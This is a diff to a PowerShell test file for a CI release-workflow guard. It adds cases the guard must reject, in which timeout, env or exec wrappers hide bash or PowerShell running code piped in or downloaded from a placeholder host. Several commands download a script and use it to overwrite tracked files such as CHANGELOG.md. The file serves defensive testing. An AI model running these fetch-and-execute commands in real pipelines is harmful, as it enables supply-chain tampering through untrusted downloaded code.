@@ -692,6 +692,22 @@ fi
         @{ Name = 'env option separator hides Bash stdin execution'; Text = "printf '%s\n' 'curl --output CHANGELOG.md https://host/payload' | env -- bash -s"; Shell = 'bash' },
         @{ Name = 'env split-string hides Bash stdin execution'; Text = "printf '%s\n' 'curl --output src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload' | env -S 'bash -s'"; Shell = 'bash' },
         @{ Name = 'timeout wrapper hides Bash stdin execution'; Text = "printf '%s\n' 'curl --output CHANGELOG.md https://host/payload' | timeout 2 bash -s"; Shell = 'bash' },
+        @{ Name = 'timeout end-of-options hides root Bash stdin writer'; Text = "printf '%s\n' 'curl --output CHANGELOG.md https://host/payload' | timeout -- 1 bash -s"; Shell = 'bash' },
+        @{ Name = 'timeout end-of-options hides nested Bash stdin writer'; Text = "printf '%s\n' 'curl --output src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload' | timeout -- 1 bash -s"; Shell = 'bash' },
+        @{ Name = 'timeout end-of-options with duration forms hides Bash stdin'; Text = 'printf x | timeout -- 1.5s bash -s'; Shell = 'bash' },
+        @{ Name = 'timeout end-of-options with zero duration hides Bash stdin'; Text = 'printf x | timeout -- 0 bash -s'; Shell = 'bash' },
+        @{ Name = 'timeout end-of-options with dynamic duration hides Bash stdin'; Text = 'printf x | timeout -- "$TIMEOUT" bash -s'; Shell = 'bash' },
+        @{ Name = 'timeout separate short option values before end-of-options hide Bash stdin'; Text = 'printf x | timeout -k 1 -s TERM -- 2 bash -s'; Shell = 'bash' },
+        @{ Name = 'timeout attached short option values before end-of-options hide Bash stdin'; Text = 'printf x | timeout -k1 -sTERM -- 2 bash -s'; Shell = 'bash' },
+        @{ Name = 'timeout separate long option values before end-of-options hide Bash stdin'; Text = 'printf x | timeout --kill-after 1 --signal TERM -- 2 bash -s'; Shell = 'bash' },
+        @{ Name = 'timeout equals long option values before end-of-options hide Bash stdin'; Text = 'printf x | timeout --kill-after=1 --signal=TERM -- 2 bash -s'; Shell = 'bash' },
+        @{ Name = 'timeout end-of-options hides absolute Bash stdin'; Text = 'printf x | timeout -- 1 /bin/bash -s'; Shell = 'bash' },
+        @{ Name = 'env separator wraps timeout end-of-options and Bash stdin'; Text = 'printf x | env -u SAFE_VALUE -- timeout -- 1 bash -s'; Shell = 'bash' },
+        @{ Name = 'env split-string wraps timeout end-of-options and Bash stdin'; Text = "printf x | env -S 'timeout -- 1 bash -s'"; Shell = 'bash' },
+        @{ Name = 'exec argv-zero wraps timeout end-of-options and Bash stdin'; Text = 'printf x | exec -a alias timeout -- 1 bash -s'; Shell = 'bash' },
+        @{ Name = 'GNU time output option wraps timeout end-of-options and Bash stdin'; Text = ('printf x | time -o "' + $workflowRunnerTemp + '/timing.txt" timeout -- 1 bash -s'); Shell = 'bash' },
+        @{ Name = 'timeout end-of-options hides downloaded Bash script'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; timeout -- 1 bash "' + $workflowRunnerTemp + '/rewrite.sh"'); Shell = 'bash' },
+        @{ Name = 'timeout end-of-options hides downloaded PowerShell script'; Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\rewrite-source.ps1"; timeout -- 1 pwsh -File "' + $workflowRunnerTemp + '\rewrite-source.ps1"'); Shell = 'pwsh' },
         @{ Name = 'wrapper chain and option arguments hide Bash stdin execution'; Text = "printf '%s\n' 'curl --output src/KeelMatrix.PackageSurface.Cli/README.md https://host/payload' | env -u SAFE_VALUE -- timeout --signal=TERM 2 bash -s"; Shell = 'bash' },
         @{ Name = 'env split-string wraps timeout and Bash stdin execution'; Text = "printf '%s\n' 'curl --output CHANGELOG.md https://host/payload' | env -S 'timeout 2 bash -s'"; Shell = 'bash' },
         @{ Name = 'exec argv-zero option hides Bash stdin execution'; Text = "printf '%s\n' 'curl --output CHANGELOG.md https://host/payload' | exec -a alias bash -s"; Shell = 'bash' },
@@ -749,6 +765,12 @@ fi
             Text = ("printf x | " + $timeoutChain + 'bash -s')
             Shell = 'bash'
         }
+        $timeoutTerminatorChain = 'timeout -- 1 ' * $depth
+        $hiddenInterpreterCases += @{
+            Name = "Bash stdin wrapper chain with timeout end-of-options at depth $depth"
+            Text = ("printf x | " + $timeoutTerminatorChain + 'bash -s')
+            Shell = 'bash'
+        }
     }
     foreach ($case in $hiddenInterpreterCases) {
         foreach ($position in @('before artifact download', 'after artifact download', 'between guarded invocations')) {
@@ -763,6 +785,41 @@ fi
             $fixture = New-WorkflowGitScriptConsumerFixture @fixtureArguments
             $rejected = $false
             try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'hidden-interpreter.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
+            catch { $rejected = $true }
+            if (-not $rejected) { throw "Workflow contract accepted $($case.Name) $position." }
+        }
+    }
+
+    $safeTimeoutCases = @(
+        @{ Name = 'timeout end-of-options preserves a tracked PowerShell script'; Text = 'timeout -- 1 pwsh -File ./scripts/validate-release-artifact-set.ps1'; Shell = 'bash' },
+        @{ Name = 'timeout option values preserve a tracked Bash script'; Text = 'timeout -k 1 -- 2 bash ./scripts/validate-release-artifact-set.ps1'; Shell = 'bash' },
+        @{ Name = 'timeout end-of-options preserves ordinary runner-temp output'; Text = ('timeout -- 1 printf payload > "' + $workflowRunnerTemp + '/timeout-output.txt"'); Shell = 'bash' }
+    )
+    foreach ($case in $safeTimeoutCases) {
+        $fixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(@{ Name = $case.Name; Text = $case.Text; Shell = $case.Shell })
+        $result = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'safe-timeout-wrapper.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('safe-timeout-wrapper.yml/future-consumer'))
+        if ($result.Count -ne 1 -or $result[0].Scripts -notcontains $script) { throw "Workflow contract rejected $($case.Name)." }
+    }
+
+    $incompleteTimeoutCases = @(
+        @{ Name = 'timeout end-of-options without a duration'; Text = 'timeout --'; Shell = 'bash' },
+        @{ Name = 'timeout duration without a command'; Text = 'timeout -- 1'; Shell = 'bash' },
+        @{ Name = 'timeout required short option value is missing'; Text = 'timeout -k'; Shell = 'bash' },
+        @{ Name = 'timeout required option value is an option terminator'; Text = 'timeout -k -- 1 bash -s'; Shell = 'bash' },
+        @{ Name = 'timeout required long option value is empty'; Text = 'timeout --kill-after= -- 1 bash -s'; Shell = 'bash' },
+        @{ Name = 'timeout duration after terminator looks like an option'; Text = 'timeout -- -- 1 bash -s'; Shell = 'bash' },
+        @{ Name = 'timeout unknown option fails closed'; Text = 'timeout --unknown-option 1 bash -s'; Shell = 'bash' }
+    )
+    foreach ($case in $incompleteTimeoutCases) {
+        foreach ($position in @('before artifact download', 'after artifact download', 'between guarded invocations')) {
+            $runStep = @{ Name = $case.Name; Text = $case.Text; Shell = $case.Shell }
+            $fixtureArguments = @{ ScriptPath = $script }
+            if ($position -eq 'before artifact download') { $fixtureArguments.RunsBeforeDownload = @($runStep) }
+            elseif ($position -eq 'after artifact download') { $fixtureArguments.RunsAfterDownload = @($runStep) }
+            else { $fixtureArguments.SecondInvocation = $true; $fixtureArguments.RunsBetweenInvocations = @($runStep) }
+            $fixture = New-WorkflowGitScriptConsumerFixture @fixtureArguments
+            $rejected = $false
+            try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'incomplete-timeout-wrapper.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
             catch { $rejected = $true }
             if (-not $rejected) { throw "Workflow contract accepted $($case.Name) $position." }
         }
@@ -785,6 +842,8 @@ fi
     $directExecutableWriterCases = @(
         @{ Name = 'downloaded executable writes tracked root'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite" https://host/payload; chmod +x "' + $workflowRunnerTemp + '/rewrite"; "' + $workflowRunnerTemp + '/rewrite" CHANGELOG.md'); Shell = 'bash' },
         @{ Name = 'downloaded executable writes nested tracked source'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite" https://host/payload; chmod +x "' + $workflowRunnerTemp + '/rewrite"; "' + $workflowRunnerTemp + '/rewrite" src/KeelMatrix.PackageSurface.Cli/README.md'); Shell = 'bash' },
+        @{ Name = 'timeout end-of-options runs downloaded script that writes tracked root'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; timeout -- 1 bash "' + $workflowRunnerTemp + '/rewrite.sh" CHANGELOG.md'); Shell = 'bash' },
+        @{ Name = 'timeout end-of-options runs downloaded script that writes nested tracked source'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; timeout -- 1 bash "' + $workflowRunnerTemp + '/rewrite.sh" src/KeelMatrix.PackageSurface.Cli/README.md'); Shell = 'bash' },
         @{ Name = 'downloaded PowerShell executable writes tracked root'; Text = 'Invoke-WebRequest -Uri https://host/payload -OutFile "$env:RUNNER_TEMP\rewrite.exe"; & "$env:RUNNER_TEMP\rewrite.exe" CHANGELOG.md'; Shell = 'pwsh' },
         @{ Name = 'downloaded PowerShell executable writes nested tracked source'; Text = 'Invoke-WebRequest -Uri https://host/payload -OutFile "$env:RUNNER_TEMP\rewrite.exe"; & "$env:RUNNER_TEMP\rewrite.exe" src/KeelMatrix.PackageSurface.Cli/README.md'; Shell = 'pwsh' },
         @{ Name = 'downloaded executable writes tracked root after runner-temp directory change'; Text = 'curl --output "$RUNNER_TEMP/rewrite" https://host/payload; chmod +x "$RUNNER_TEMP/rewrite"; cd "$RUNNER_TEMP"; ./rewrite CHANGELOG.md'; Shell = 'bash' },
@@ -809,6 +868,41 @@ fi
             catch { $rejected = $true }
             if (-not $rejected) { throw "Workflow contract accepted $($case.Name) $position." }
         }
+    }
+
+    $timeoutWrappedTrackedWriterCases = @(
+        @{ Name = 'timeout-wrapped downloaded script can write tracked root'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; timeout -- 1 bash "' + $workflowRunnerTemp + '/rewrite.sh" CHANGELOG.md') },
+        @{ Name = 'timeout-wrapped downloaded script can write nested tracked source'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; timeout -- 1 bash "' + $workflowRunnerTemp + '/rewrite.sh" src/KeelMatrix.PackageSurface.Cli/README.md') }
+    )
+    $shellRestoreCommands = @(
+        'git checkout --detach ''${{ github.sha }}''',
+        'git switch --detach ''${{ github.sha }}'''
+    )
+    foreach ($case in $timeoutWrappedTrackedWriterCases) {
+        foreach ($position in @('before artifact download', 'after artifact download', 'between guarded invocations')) {
+            foreach ($restoreCommand in $shellRestoreCommands) {
+                $runSteps = @(
+                    @{ Name = $case.Name; Text = $case.Text; Shell = 'bash' },
+                    @{ Name = 'Attempt shell checkout or switch restoration'; Text = $restoreCommand; Shell = 'bash' }
+                )
+                $fixtureArguments = @{ ScriptPath = $script }
+                if ($position -eq 'before artifact download') { $fixtureArguments.RunsBeforeDownload = $runSteps }
+                elseif ($position -eq 'after artifact download') { $fixtureArguments.RunsAfterDownload = $runSteps }
+                else { $fixtureArguments.SecondInvocation = $true; $fixtureArguments.RunsBetweenInvocations = $runSteps }
+                $fixture = New-WorkflowGitScriptConsumerFixture @fixtureArguments
+                $rejected = $false
+                try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'timeout-wrapped-direct-writer.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
+                catch { $rejected = $true }
+                if (-not $rejected) { throw "Workflow contract accepted $($case.Name) $position despite a shell checkout or switch." }
+            }
+        }
+    }
+
+    $timeoutActionRestoreWriter = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; timeout -- 1 bash "' + $workflowRunnerTemp + '/rewrite.sh" CHANGELOG.md')
+    $timeoutActionRestoreFixture = New-WorkflowRunnerTempRedirectFixture -ScriptPath $script -LinkText $timeoutActionRestoreWriter -WriteText 'printf payload' -Shell 'bash' -Position 'after artifact download' -IncludeShellCheckout
+    $timeoutActionRestoreResult = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'timeout-wrapped-action-restore.yml'; Text = $timeoutActionRestoreFixture }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('timeout-wrapped-action-restore.yml/future-consumer'))
+    if ($timeoutActionRestoreResult.Count -ne 1 -or $timeoutActionRestoreResult[0].Scripts -notcontains $script) {
+        throw 'A clean unconditional root action checkout must restore tracked bytes after a timeout-wrapped downloaded writer.'
     }
 
     $directExecutableLinkCases = @(
@@ -910,6 +1004,28 @@ fi
             $fixture = New-WorkflowRunnerTempRedirectFixture -ScriptPath $script -LinkText $case.Text -WriteText $case.Write -Shell 'bash' -Position $position -IncludeShellCheckout
             $rejected = $false
             try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'bash-variable-runner-temp-executable.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
+            catch { $rejected = $true }
+            if (-not $rejected) { throw "Workflow contract accepted $($case.Name) $position around shell and action checkout ordering." }
+        }
+    }
+
+    $timeoutWrappedScriptLinkCases = @(
+        @{
+            Name = 'timeout end-of-options runs downloaded script that links the tracked root'
+            Link = ('curl --output "' + $workflowRunnerTemp + '/prepare.sh" https://host/payload; timeout -- 1 bash "' + $workflowRunnerTemp + '/prepare.sh" "$GITHUB_WORKSPACE" "$RUNNER_TEMP/escape"')
+            Write = ('curl --output "' + $workflowRunnerTemp + '/escape/CHANGELOG.md" https://host/payload')
+        },
+        @{
+            Name = 'timeout end-of-options runs downloaded script that links a nested tracked directory'
+            Link = ('curl --output "' + $workflowRunnerTemp + '/prepare.sh" https://host/payload; timeout -- 1 bash "' + $workflowRunnerTemp + '/prepare.sh" "$GITHUB_WORKSPACE/src/KeelMatrix.PackageSurface.Cli" "$RUNNER_TEMP/escape"')
+            Write = ('Copy-Item source "' + $workflowRunnerTemp + '\escape\README.md"')
+        }
+    )
+    foreach ($case in $timeoutWrappedScriptLinkCases) {
+        foreach ($position in @('before artifact download', 'after artifact download', 'between guarded invocations')) {
+            $fixture = New-WorkflowRunnerTempRedirectFixture -ScriptPath $script -LinkText $case.Link -WriteText $case.Write -Shell 'bash' -Position $position -IncludeShellCheckout
+            $rejected = $false
+            try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'timeout-wrapped-runner-temp-link.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
             catch { $rejected = $true }
             if (-not $rejected) { throw "Workflow contract accepted $($case.Name) $position around shell and action checkout ordering." }
         }
